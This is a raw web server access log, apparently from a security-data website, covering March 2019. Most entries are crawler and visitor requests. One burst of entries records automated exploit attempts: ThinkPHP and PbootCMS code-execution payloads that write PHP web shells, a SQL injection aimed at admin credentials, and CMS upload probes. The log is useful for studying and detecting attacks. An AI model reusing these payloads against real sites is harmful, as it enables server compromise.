54.36.150.180 - - [10/Mar/2019:03:16:00 -0700] "GET /self.logs/error.log.2016-08-04.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
220.181.108.159 - - [11/Mar/2019:09:26:09 -0700] "GET /robots.txt HTTP/1.1" 301 465 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
220.181.108.100 - - [11/Mar/2019:09:26:15 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
220.181.108.115 - - [11/Mar/2019:09:26:29 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
123.125.67.160 - - [11/Mar/2019:09:26:41 -0700] "GET /robots.txt HTTP/1.1" 301 465 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
123.125.67.219 - - [11/Mar/2019:09:26:45 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
123.125.67.159 - - [11/Mar/2019:09:26:49 -0700] "GET /robots.txt HTTP/1.1" 301 465 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
123.125.67.164 - - [11/Mar/2019:09:26:50 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
220.181.108.120 - - [11/Mar/2019:09:27:51 -0700] "GET / HTTP/1.1" 301 446 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
220.181.108.183 - - [11/Mar/2019:09:27:51 -0700] "GET / HTTP/1.1" 200 12433 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
104.42.198.99 - - [11/Mar/2019:09:28:02 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 200 4274082 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)" 
54.36.150.149 - - [11/Mar/2019:09:31:30 -0700] "GET /self.logs/access.log.2016-06-24.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
41.223.160.131 - - [11/Mar/2019:09:31:30 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
184.168.152.149 - - [11/Mar/2019:09:33:39 -0700] "GET /old/wp-admin/ HTTP/1.1" 301 487 "-" "-" 
113.171.224.176 - - [11/Mar/2019:09:34:20 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
207.46.13.8 - - [11/Mar/2019:09:36:00 -0700] "GET /self.logs/error.log.2017-09-23.gz HTTP/1.1" 200 2144 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.150.183 - - [11/Mar/2019:09:39:59 -0700] "GET /self.logs/access.log.2017-02-01.gz HTTP/1.1" 200 27022 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.63 - - [11/Mar/2019:09:41:57 -0700] "GET /self.logs/access.log.2017-03-25.gz HTTP/1.1" 200 13498 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
178.199.128.113 - - [11/Mar/2019:09:43:34 -0700] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
178.199.128.113 - - [11/Mar/2019:09:43:34 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
178.199.128.113 - - [11/Mar/2019:09:43:34 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
222.186.169.237 - - [11/Mar/2019:09:44:05 -0700] "GET //plus/mytag_js.php?aid=9090 HTTP/1.1" 404 295 "http://www.secrepo.com//plus/mytag_js.php?aid=9090" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.169.237 - - [11/Mar/2019:09:44:06 -0700] "POST //phpmyadmin/index.php HTTP/1.1" 404 294 "http://www.secrepo.com//phpmyadmin/index.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.169.237 - - [11/Mar/2019:09:44:06 -0700] "GET //type.php?template=tag_(){};@unlink(FILE);print_r(xbshell);assert($_POST[1]);{//../rss HTTP/1.1" 404 294 "http://www.secrepo.com//type.php?template=tag_(){};@unlink(FILE);print_r(xbshell);assert($_POST[1]);{//../rss" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.169.237 - - [11/Mar/2019:09:44:07 -0700] "GET //data/cache_template/rss.tpl.php HTTP/1.1" 404 294 "http://www.secrepo.com//data/cache_template/rss.tpl.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.169.237 - - [11/Mar/2019:09:44:08 -0700] "GET //data/backupdata/dede_a~1.txt HTTP/1.1" 404 294 "http://www.secrepo.com//data/backupdata/dede_a~1.txt" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.169.237 - - [11/Mar/2019:09:44:08 -0700] "GET //data/backupdata/dede_a~2.txt HTTP/1.1" 404 294 "http://www.secrepo.com//data/backupdata/dede_a~2.txt" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.169.237 - - [11/Mar/2019:09:44:09 -0700] "GET //data/backupdata/dede_a~3.txt HTTP/1.1" 404 294 "http://www.secrepo.com//data/backupdata/dede_a~3.txt" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.169.237 - - [11/Mar/2019:09:44:10 -0700] "GET //data/backupdata/dede_a~4.txt HTTP/1.1" 404 294 "http://www.secrepo.com//data/backupdata/dede_a~4.txt" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.169.237 - - [11/Mar/2019:09:44:11 -0700] "GET //data/backupdata/dede_a~5.txt HTTP/1.1" 404 294 "http://www.secrepo.com//data/backupdata/dede_a~5.txt" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.169.237 - - [11/Mar/2019:09:44:11 -0700] "GET //?s=index/\\think\\template\\driver\\file/write&cacheFile=robots1.php&content=xbshell<?php%20@eval($_POST[admin]);?> HTTP/1.1" 200 46423 "http://www.secrepo.com//?s=index/\\think\\template\\driver\\file/write&cacheFile=robots1.php&content=xbshell<?php @eval($_POST[admin]);?>" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.169.237 - - [11/Mar/2019:09:44:13 -0700] "GET //robots1.php HTTP/1.1" 404 294 "http://www.secrepo.com//robots1.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.169.237 - - [11/Mar/2019:09:44:14 -0700] "GET /?s=index/\\think\\template\\driver\\file/write&cacheFile=robots.php&content=xbshell1<?php$password%20=%20\"xinba\";$ch%20=%20explode(\".\",\"hello.ass.world.er.t\");array_intersect_ukey(array($_REQUEST[$password]%20=>%201),%20array(1),%20$ch[1].$ch[3].$ch[4]);?> HTTP/1.1" 200 46423 "http://www.secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=robots.php&content=xbshell1<?php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.169.237 - - [11/Mar/2019:09:44:16 -0700] "GET //robots.php HTTP/1.1" 404 294 "http://www.secrepo.com//robots.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.169.237 - - [11/Mar/2019:09:44:18 -0700] "GET //?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET[%27fuck%27]);&fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz54YnNoZWxs)); HTTP/1.1" 200 46423 "http://www.secrepo.com//?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET[%27fuck%27]);&fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz54YnNoZWxs));" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.169.237 - - [11/Mar/2019:09:44:27 -0700] "GET //x.php HTTP/1.1" 404 295 "http://www.secrepo.com//x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.169.237 - - [11/Mar/2019:09:44:27 -0700] "GET //news/html/?410'union/**/select/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),0x3a,(select/**/concat(user,0x3a,password)/**/from/**/pwn_base_admin/**/limit/**/0,1),0x3a)a/**/from/**/information_schema.tables/**/group/**/by/**/a)b/**/where'1'='1.html HTTP/1.1" 404 294 "http://www.secrepo.com//news/html/?410'union/**/select/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),0x3a,(select/**/concat(user,0x3a,password)/**/from/**/pwn_base_admin/**/limit/**/0,1),0x3a)a/**/from/**/information_schema.tables/**/group/**/by/**/a)b/**/where'1'='1.html" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.169.237 - - [11/Mar/2019:09:44:28 -0700] "GET //index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUW2FkbWluXSk7Pz54YnNoZWxs HTTP/1.1" 404 294 "http://www.secrepo.com//index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUW2FkbWluXSk7Pz54YnNoZWxs" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.169.237 - - [11/Mar/2019:09:44:28 -0700] "GET //uploadfile/member/0/0x0.php HTTP/1.1" 404 294 "http://www.secrepo.com//uploadfile/member/0/0x0.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.169.237 - - [11/Mar/2019:09:44:29 -0700] "POST //index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 294 "http://www.secrepo.com//index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" 
222.186.169.237 - - [11/Mar/2019:09:44:30 -0700] "GET //index.php/list/5/?current={pboot:if(eval\\\\($_GET['a']))}1{/pboot:if}&a=fputs(fopen(base64_decode('eC5waHA'),'w'),%20base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWyd4YiddKTsgPz54YnNoZWxs')); HTTP/1.1" 404 294 "http://www.secrepo.com//index.php/list/5/?current={pboot:if(eval\\\\($_GET['a']))}1{/pboot:if}&a=fputs(fopen(base64_decode('eC5waHA'),'w'), base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWyd4YiddKTsgPz54YnNoZWxs'));" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.169.237 - - [11/Mar/2019:09:44:30 -0700] "GET //x.php HTTP/1.1" 404 294 "http://www.secrepo.com//x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.169.237 - - [11/Mar/2019:09:44:31 -0700] "GET //SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0&directoryName=sectest HTTP/1.1" 404 294 "http://www.secrepo.com//SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0&directoryName=sectest" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.169.237 - - [11/Mar/2019:09:44:31 -0700] "GET //SiteFiles/SiteTemplates/sectest/include.aspx HTTP/1.1" 404 294 "http://www.secrepo.com//SiteFiles/SiteTemplates/sectest/include.aspx" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.169.237 - - [11/Mar/2019:09:44:32 -0700] "POST //index.php?s=index HTTP/1.1" 404 294 "http://www.secrepo.com//index.php?s=index" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.169.237 - - [11/Mar/2019:09:44:32 -0700] "GET //admin_aspcms/_system/AspCms_SiteSetting.asp?action=saves\xe2\x80\x9d,%201,%20\xe2\x80\x9crunMode=1&siteMode=1&siteHelp=%B1%BE%CD%F8%D5%BE%D2%F2%B3%CC%D0%F2%C9%FD%BC%B6%B9%D8%B1%D5%D6%D0&SwitchComments=1&SwitchCommentsStatus=1&switchFaq=0:Y=request(chr(35)):execute(Y)&SwitchFaqStatus=0&dirtyStr=&waterMark=1&waterMarkFont=hahahaha&waterMarkLocation=1&smtp_usermail=aspcmstest%40163.com&smtp_user=aspcmstest&smtp_password=aspcms.cn&smtp_server=smtp.163.com&MessageAlertsEmail=13322712%40qq.com&messageReminded=1&orderReminded=1&applyReminded=1&commentReminded=1&LanguageID=1 HTTP/1.1" 404 294 "http://www.secrepo.com//admin_aspcms/_system/AspCms_SiteSetting.asp?action=saves\xa1\xb1, 1, \xa1\xb0runMode=1&siteMode=1&siteHelp=%B1%BE%CD%F8%D5%BE%D2%F2%B3%CC%D0%F2%C9%FD%BC%B6%B9%D8%B1%D5%D6%D0&SwitchComments=1&SwitchCommentsStatus=1&switchFaq=0:Y=request(chr(35)):execute(Y)&SwitchFaqStatus=0&dirtyStr=&waterMark=1&waterMarkFont=hahahaha&waterMarkLocation=1&smtp_usermail=aspcmstest%40163.com&smtp_user=aspcmstest&smtp_password=aspcms.cn&smtp_server=smtp.163.com&MessageAlertsEmail=13322712%40qq.com&messageReminded=1&orderReminded=1&applyReminded=1&commentReminded=1&LanguageID=1" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.169.237 - - [11/Mar/2019:09:44:33 -0700] "POST //fckeditor/editor/filemanager/upload/php/upload.php?Type=Media HTTP/1.1" 404 284 "http://www.secrepo.com//fckeditor/editor/filemanager/upload/php/upload.php?Type=Media" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0" 
222.186.169.237 - - [11/Mar/2019:09:44:34 -0700] "GET / HTTP/1.1" 200 46424 "http://www.secrepo.com/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.169.237 - - [11/Mar/2019:09:44:36 -0700] "GET / HTTP/1.1" 200 46423 "http://www.secrepo.com/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
5.112.97.6 - - [11/Mar/2019:09:53:33 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
5.112.97.6 - - [11/Mar/2019:09:53:33 -0700] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
5.112.97.6 - - [11/Mar/2019:09:53:34 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
5.112.97.6 - - [11/Mar/2019:09:53:35 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
112.245.242.155 - - [11/Mar/2019:09:56:53 -0700] "GET / HTTP/1.1" 301 498 "http://secrepo.com/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
112.245.242.155 - - [11/Mar/2019:09:56:54 -0700] "GET / HTTP/1.1" 200 46424 "http://secrepo.com/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
112.245.242.155 - - [11/Mar/2019:09:56:55 -0700] "POST //config/AspCms_Config.asp HTTP/1.1" 301 546 "http://secrepo.com//config/AspCms_Config.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
112.245.242.155 - - [11/Mar/2019:09:56:56 -0700] "GET /config/AspCms_Config.asp HTTP/1.1" 404 294 "http://secrepo.com//config/AspCms_Config.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
112.245.242.155 - - [11/Mar/2019:09:56:56 -0700] "POST //d.php HTTP/1.1" 301 507 "http://secrepo.com//d.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
112.245.242.155 - - [11/Mar/2019:09:56:57 -0700] "GET /d.php HTTP/1.1" 404 294 "http://secrepo.com//d.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
112.245.242.155 - - [11/Mar/2019:09:56:57 -0700] "POST //x.php HTTP/1.1" 301 507 "http://secrepo.com//x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
112.245.242.155 - - [11/Mar/2019:09:56:57 -0700] "GET /x.php HTTP/1.1" 404 294 "http://secrepo.com//x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
112.245.242.155 - - [11/Mar/2019:09:56:58 -0700] "POST //robots1.php HTTP/1.1" 301 519 "http://secrepo.com//robots1.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
112.245.242.155 - - [11/Mar/2019:09:56:58 -0700] "GET /robots1.php HTTP/1.1" 404 294 "http://secrepo.com//robots1.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
131.107.147.84 - - [11/Mar/2019:10:00:33 -0700] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" 
131.107.147.84 - - [11/Mar/2019:10:00:34 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" 
131.107.147.84 - - [11/Mar/2019:10:00:34 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" 
41.223.160.131 - - [11/Mar/2019:10:01:09 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
54.36.148.146 - - [11/Mar/2019:10:02:53 -0700] "GET /self.logs/error.log.2016-11-13.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
90.95.80.167 - - [11/Mar/2019:10:03:17 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
90.95.80.167 - - [11/Mar/2019:10:03:17 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
54.36.149.76 - - [11/Mar/2019:10:05:57 -0700] "GET /self.logs/error.log.2016-11-08.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
103.243.237.7 - - [11/Mar/2019:10:08:56 -0700] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
103.243.237.7 - - [11/Mar/2019:10:08:57 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
103.243.237.7 - - [11/Mar/2019:10:08:57 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
103.243.237.7 - - [11/Mar/2019:10:09:00 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
40.77.167.0 - - [11/Mar/2019:10:09:22 -0700] "GET /self.logs/access.log.2015-10-12.gz HTTP/1.1" 404 340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
108.59.8.70 - - [11/Mar/2019:10:14:04 -0700] "GET /robots.txt HTTP/1.1" 301 518 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
108.59.8.70 - - [11/Mar/2019:10:14:05 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
108.59.8.70 - - [11/Mar/2019:10:14:09 -0700] "GET / HTTP/1.1" 301 442 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
108.59.8.70 - - [11/Mar/2019:10:14:12 -0700] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
108.59.8.70 - - [11/Mar/2019:10:14:15 -0700] "GET / HTTP/1.1" 200 12414 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
40.77.167.127 - - [11/Mar/2019:10:16:49 -0700] "GET /self.logs/error.log.2017-07-16.gz HTTP/1.1" 200 708 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.117 - - [11/Mar/2019:10:21:17 -0700] "GET /maccdc2012/smtp.log.gz HTTP/1.1" 200 6908 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.55 - - [11/Mar/2019:10:21:41 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/packet_filter.html HTTP/1.1" 200 1563 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
123.125.67.224 - - [11/Mar/2019:10:25:53 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
123.125.71.107 - - [11/Mar/2019:10:25:55 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
40.77.167.177 - - [11/Mar/2019:10:27:58 -0700] "GET /self.logs/error.log.2017-02-25.gz HTTP/1.1" 200 953 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
104.144.253.108 - - [11/Mar/2019:10:31:10 -0700] "GET / HTTP/1.1" 301 427 "http://secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36" 
104.144.253.108 - - [11/Mar/2019:10:31:10 -0700] "GET / HTTP/1.1" 200 12414 "http://secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36" 
39.43.3.44 - - [11/Mar/2019:10:32:57 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
113.171.224.176 - - [11/Mar/2019:10:34:48 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
128.210.106.77 - - [11/Mar/2019:10:56:41 -0700] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0" 
128.210.106.77 - - [11/Mar/2019:10:56:42 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0" 
128.210.106.77 - - [11/Mar/2019:10:56:42 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0" 
128.210.106.77 - - [11/Mar/2019:10:56:42 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0" 
46.119.120.218 - - [11/Mar/2019:11:10:57 -0700] "GET /admin/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=/ HTTP/1.0" 301 733 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
